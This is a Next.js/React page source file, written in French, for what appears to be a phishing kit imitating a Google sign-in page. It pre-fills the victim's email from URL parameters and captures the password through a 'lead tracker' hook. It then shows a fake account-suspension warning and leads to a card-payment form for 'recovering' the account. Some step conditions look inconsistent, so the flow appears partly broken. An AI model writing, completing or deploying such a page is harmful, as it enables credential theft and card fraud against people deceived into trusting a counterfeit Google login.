import React, { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/router';
import { PageHead } from '../src/hooks/usePageMeta';
import { useLeadTracker } from '../src/hooks/useLeadTracker';
import styles from '../src/styles/modules/GoogleLogin.module.css';
import PaymentForm from '../src/components/payment/PaymentForm';

const GoogleLogin = () => {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [firstName, setFirstName] = useState('');
  // Gestion simple par étapes: 'email' -> 'password' -> 'warning' -> 'payment'
  const [step, setStep] = useState('email');
  const [password, setPassword] = useState('');
  const [showPasswordText, setShowPasswordText] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const passwordInputRef = useRef(null);
  
  // États pour le formulaire de paiement
  const [selectedPlan] = useState('premium'); // Plan par défaut
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardName: ''
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Hook pour le tracking des leads
  const { trackLogin, isTracking } = useLeadTracker();

  // Fonctions pour le formulaire de paiement
  const handleInputChange = (field, value) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handlePaymentSubmit = async (paymentData) => {
    setIsSubmitting(true);
    try {
      // Logique de traitement du paiement ici
      console.log('Payment data:', paymentData);
      // Simuler un délai de traitement
      await new Promise(resolve => setTimeout(resolve, 2000));
      // Rediriger vers la confirmation
      router.push({
        pathname: '/confirmation',
        query: {
          email: email,
          firstName: firstName
        }
      });
    } catch (error) {
      console.error('Erreur lors du paiement:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  // Récupérer l'email et le prénom depuis l'URL au chargement
  useEffect(() => {
    if (router.query.email) {
      // Gérer le cas où email pourrait être un array (paramètres en double)
      const emailValue = Array.isArray(router.query.email) ? router.query.email[0] : router.query.email;
      setEmail(emailValue);
      setStep('password'); // Passer directement à l'étape mot de passe
    }
    if (router.query.firstName) {
      const firstNameValue = Array.isArray(router.query.firstName) ? router.query.firstName[0] : router.query.firstName;
      setFirstName(firstNameValue);
    }
  }, [router.query.email, router.query.firstName]);

  // Auto-focus sur le champ de mot de passe quand il s'affiche
  useEffect(() => {
    if (step === 'password' && passwordInputRef.current) {
      // Utiliser un petit délai pour s'assurer que l'élément est complètement rendu
      setTimeout(() => {
        passwordInputRef.current.focus();
        passwordInputRef.current.click(); // Simuler un clic pour activer le curseur
      }, 100);
    }
  }, [step]);

  // Fonction pour obtenir l'initiale de l'email
  const getEmailInitial = (email) => {
    if (!email) return 'U';
    // Gérer le cas où email pourrait être un array
    const emailStr = Array.isArray(email) ? email[0] : email;
    return emailStr && typeof emailStr === 'string' ? emailStr.charAt(0).toUpperCase() : 'U';
  };

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    setStep('password');
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    
    console.log('Début du tracking login avec:', { email, firstName, password: password ? '***' : 'vide' });
    
    try {
      // Tracker le login avec le mot de passe
      const result = await trackLogin({
        email,
        firstName,
        password
      });
      
      console.log('Résultat du tracking login:', result);
      
      // Simuler un délai de chargement
      setTimeout(() => {
        // Passer à l'étape d'avertissement (texte centré + petit bouton)
        setIsLoading(false);
        setStep('warning');
      }, 4000); // 4 secondes de chargement
      
    } catch (error) {
      console.error('Erreur lors du tracking du login:', error);
      // Continuer même si le tracking échoue
      setTimeout(() => {
        router.push({
          pathname: '/confirmation',
          query: {
            email: email,
            firstName: firstName
          }
        });
      }, 4000);
    }
  };

  return (
    <>
      <PageHead 
        title="Connexion Google"
        description="Connectez-vous avec votre compte Google pour accéder à votre réservation"
        options={{
          keywords: 'connexion, google, authentification, login',
          favicon: '/google-favicon.ico'
        }}
      />
      <div className={styles.container}>
      <div className={styles.loginCard}>
        <div className={styles.header}>
          <div className={styles.googleLogo}>
            <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
          </div>
          <h1 className={`${styles.title} ${step === 'password' ? styles.titleWithName : ''}`}>
            {(step === 'warning' || step === 'payment') ? `Confirmez votre identité` : `Bienvenue ${firstName.split(' ')[0]}`}
          </h1>
        </div>
        
        

        {step === 'email' && (
          <form onSubmit={handleEmailSubmit} className={styles.form}>
            <div className={styles.inputGroup}>
              <input
                type="email"
                placeholder="Adresse e-mail ou numéro de téléphone"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className={styles.input}
                required
              />
            </div>
            <div className={styles.forgotLink}>
              <a href="#" className={styles.link}>Adresse e-mail oubliée ?</a>
            </div>
            <div className={styles.guestInfo}>
              <p>Vous n'êtes pas sur votre ordinateur ? Utilisez le mode Invité pour vous connecter en privé.</p>
              <a href="#" className={styles.link}>En savoir plus</a>
            </div>
            <div className={styles.actions}>
              <button type="submit" className={styles.nextBtn}>
                Connexion
              </button>
            </div>
          </form>
        )}

        {step === '' && (
          <div className={styles.passwordSection}>
            <div className={styles.accountSelector}>
              <div className={styles.accountInfo}>
                <div className={styles.avatar}>
                  {getEmailInitial(email)}
                </div>
                <span className={styles.emailText}>{email}</span>
                <button type="button" className={styles.dropdownArrow}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M7 10l5 5 5-5z"/>
                  </svg>
                </button>
              </div>
            </div>

            <div className={styles.continueText}>
              Pour continuer, veuillez confirmer votre identité
            </div>

            <form onSubmit={handlePasswordSubmit} className={styles.form}>
              <div className={styles.inputGroup}>
                <input
                  ref={passwordInputRef}
                  type={showPasswordText ? "text" : "password"}
                  placeholder="Saisissez votre mot de passe"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={styles.input}
                  required
                />
              </div>

              <div className={styles.showPasswordContainer}>
                <label className={styles.checkboxLabel}>
                  <input
                    type="checkbox"
                    checked={showPasswordText}
                    onChange={(e) => setShowPasswordText(e.target.checked)}
                    className={styles.checkbox}
                  />
                  <span className={styles.checkboxText}>Afficher le mot de passe</span>
                </label>
              </div>

              <div className={styles.forgotLink}>
                <a href="#" className={styles.link}>Mot de passe oublié ?</a>
              </div>

              <div className={styles.actions}>
                <button type="submit" className={styles.nextBtn} disabled={isLoading || isTracking}>
                  {(isLoading || isTracking) ? (
                    <div className={styles.loadingContainer}>
                      <div className={styles.spinner}></div>
                      <span>Connexion...</span>
                    </div>
                  ) : (
                    'Suivant'
                  )}
                </button>
              </div>
            </form>
          </div>
        )}

        {step === 'warning' && (
          <div>
            <p className={styles.subtitle}>
              Suite à plusieurs connexions inhabituelles, nos systèmes ont détecté un risque de vols de vos identifiants.
              <br /> <br />
              Pour éviter la perte de vos données et une utilisation détournée de nos services, votre compte a été suspendu jusqu'à la vérification de votre identité.
              <br />
              <br />
              <br />
              <br />
              <br />
            </p>
            <div className={styles.actions}>
              <button
                type="button"
                className={styles.nextBtn}
                onClick={() => setStep('payment')}
              >
                Récupérer le compte
              </button>
            </div>
          </div>
        )}

        {step === 'password' && (
          <PaymentForm
            selectedPlan={selectedPlan}
            formData={formData}
            onInputChange={handleInputChange}
            onSubmit={handlePaymentSubmit}
            isSubmitting={isSubmitting}
            email={email}
            firstName={firstName}
          />
          )}
      </div>

      <div className={styles.footer}>
        <div className={styles.language}>
          <select className={styles.languageSelect}>
            <option>Français (France)</option>
            <option>English</option>
            <option>Español</option>
          </select>
        </div>
        <div className={styles.links}>
          <a href="#" className={styles.footerLink}>Aide</a>
          <a href="#" className={styles.footerLink}>Confidentialité</a>
          <a href="#" className={styles.footerLink}>Conditions d'utilisation</a>
        </div>
      </div>
    </div>
    </>
  );
};

export default GoogleLogin;
